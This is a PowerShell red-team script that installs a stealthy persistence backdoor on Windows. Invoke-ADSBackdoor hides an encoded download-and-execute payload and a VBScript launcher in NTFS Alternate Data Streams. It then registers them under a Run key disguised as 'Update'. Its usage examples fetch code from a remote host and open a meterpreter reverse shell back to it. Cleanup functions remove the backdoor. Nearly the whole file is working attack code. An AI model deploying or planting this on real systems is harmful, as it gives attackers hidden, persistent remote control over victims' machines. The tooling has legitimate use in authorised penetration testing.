function Invoke-ADSBackdoor{
<#
.SYNOPSIS
Powershell Script that will use Alternate Data Streams to achieve persistence
Author: Matt Nelson (@enigma0x3)

.DESCRIPTION
This script will obtain persistence on a Windows 7+ machine under both Standard and Administrative accounts by 
using two Alternate Data Streams. The first Alternate Data stream stores the payloadand the second Alternate Data Stream 
stores some VBScript that acts as a wrapper in order to hide the DOS prompt when invoking the data stream containing the 
payload. When passing the arguments, you have to include the function and any parameters required by your payload. 
The arguments must also be in quotation marks.


.EXAMPLE
PS C:\Users\test\Desktop> Invoke-ADSBackdoor -URL http://192.168.1.138/payload.ps1 -Arguments "hack"

This will use the function "Hack" in payload.ps1 for persistence

.EXAMPLE

PS C:\Users\test\Desktop> Invoke-ADSBackdoor -URL http://192.168.1.138/Invoke-Shellcode.ps1 -Arguments "Invoke-Shellcode
 -Lhost 192.168.1.138 -LPort 2222 -Payload windows/meterpreter/reverse_https -Force"

This will use the function Invoke-Shellcode in Invoke-Shellcode.ps1 to shovel meterpreter back to 192.168.1.138 on port 
2222 over HTTPS. 

PowerSploit Function: Invoke-Shellcode
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.EXAMPLE
meterpreter>shell
Process 4780 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.
C:\>powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.138/Invoke-ADSBackdoor.ps1'); Invoke-ADSBackdoor 
-URL http://192.168.1.138/Invoke-Shellcode.ps1 
-Arguments 'Invoke-Shellcode -LHost 192.168.1.138 -LPort 666 -Payload windows/meterpreter/reverse_https -Force'"

This will execute the persistence script using Invoke-Shellcode as the payload from a meterpreter session

#>

    [CmdletBinding()]
    Param(
       [Parameter(Mandatory=$True)]
       [string]$URL,
        
       [Parameter(Mandatory=$False)]
       [String]$Arguments
    )

    $TextfileName = [System.IO.Path]::GetRandomFileName() + ".txt"
    $textFile = $TextfileName -split '\.',([regex]::matches($TextfileName,"\.").count) -join ''
    $VBSfileName = [System.IO.Path]::GetRandomFileName() + ".vbs"
    $vbsFile = $VBSFileName -split '\.',([regex]::matches($VBSFileName,"\.").count) -join ''

    #Store Payload
    $payloadParameters = "IEX ((New-Object Net.WebClient).DownloadString('$URL')); $Arguments"
    $encodedPayload = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payloadParameters))
    $payload = "powershell.exe -ep Bypass -noexit -enc $encodedPayload"

    #Store VBS Wrapper
    $vbstext1 = "Dim objShell"
    $vbstext2 = "Set objShell = WScript.CreateObject(""WScript.Shell"")"
    $vbstext3 = "command = ""cmd /C for /f """"delims=,"""" %i in ($env:UserProfile\AppData:$textFile) do %i"""
    $vbstext4 = "objShell.Run command, 0"
    $vbstext5 = "Set objShell = Nothing"
    $vbText = $vbstext1 + ":" + $vbstext2 + ":" + $vbstext3 + ":" + $vbstext4 + ":" + $vbstext5

    #Create Alternate Data Streams for Payload and Wrapper
    $CreatePayloadADS = {cmd /C "echo $payload > $env:USERPROFILE\AppData:$textFile"}
    $CreateWrapperADS = {cmd /C "echo $vbtext > $env:USERPROFILE\AppData:$vbsFile"}
    Invoke-Command -ScriptBlock $CreatePayloadADS
    "Payload stored in $env:USERPROFILE\AppData:$textFile"
    Invoke-Command -ScriptBlock $CreateWrapperADS
    "Wrapper stored in $env:USERPROFILE\AppData:$vbsFile"

    #Persist in Registry
    new-itemproperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name Update -PropertyType String -Value "wscript.exe $env:USERPROFILE\AppData:$vbsFile" -Force
    "Process Complete. Persistent key is located at HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\Update"
}


function Remove-ADS {
<#
.SYNOPSIS
Removes an alterate data stream from a specified location.
P/Invoke code adapted from PowerSploit's Mayhem.psm1 module.
Author: @harmj0y, @mattifestation
License: BSD 3-Clause

.LINK
https://github.com/mattifestation/PowerSploit/blob/master/Mayhem/Mayhem.psm1

#>
    [CmdletBinding()] Param(
        [Parameter(Mandatory=$True)]
        [string]$ADSPath
    )
 
    #region define P/Invoke types dynamically
    #   stolen from PowerSploit https://github.com/mattifestation/PowerSploit/blob/master/Mayhem/Mayhem.psm1
    $DynAssembly = New-Object System.Reflection.AssemblyName('Win32')
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32', $False)
 
    $TypeBuilder = $ModuleBuilder.DefineType('Win32.Kernel32', 'Public, Class')
    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
    $SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor,
        @('kernel32.dll'),
        [Reflection.FieldInfo[]]@($SetLastError),
        @($True))
 
    # Define [Win32.Kernel32]::DeleteFile
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('DeleteFile',
        'kernel32.dll',
        ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
        [Reflection.CallingConventions]::Standard,
        [Bool],
        [Type[]]@([String]),
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::Ansi)
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
    
    $Kernel32 = $TypeBuilder.CreateType()
    
    $Result = $Kernel32::DeleteFile($ADSPath)

    if ($Result){
        Write-Verbose "Alternate Data Stream at $ADSPath successfully removed."
    }
    else{
        Write-Verbose "Alternate Data Stream at $ADSPath removal failure!"
    }

    $Result
}


function Remove-ADSBackdoor {
<#
.SYNOPSIS
Removes the backdoor installed by Invoke-ADSBackdoor.

.DESCRIPTION
This function will remove the persistence installed by Invoke-ADSBackdoor by parsing
the run registry run key, removing the alternate data stream files, and then
removing the registry key.
#>

    # get the VBS trigger command/file location from the registry
    $trigger = (gp HKCU:\Software\Microsoft\Windows\CurrentVersion\Run Update).Update
    $vbsFile = $trigger.split(" ")[1]
    $getWrapperADS = {cmd /C "more <  $vbsFile"}
    $wrapper = Invoke-Command -ScriptBlock $getWrapperADS

    if ($wrapper -match 'i in \((.+?)\)')
    {
        # extract out the payload .txt file location
        $textFile = $matches[1]
        if($( Remove-ADS $textFile)){
            "Successfully removed payload file $textFile"
        }
        else{
            "[!] Error in removing payload file $textFile"
        }
        
    }
    else{
        "[!] Error: couldn't extract PowerShell script location from VBS wrapper $vbsFile"
    }

    if($(Remove-ADS $vbsFile)){
        "Successfully removed wrapper file $vbsFile"
    }
    else{
         "[!] Error in removing payload file $textFile"
    }

    # remove the registry run key
    Remove-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update;
    "Successfully removed HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ 'Update' key"
}
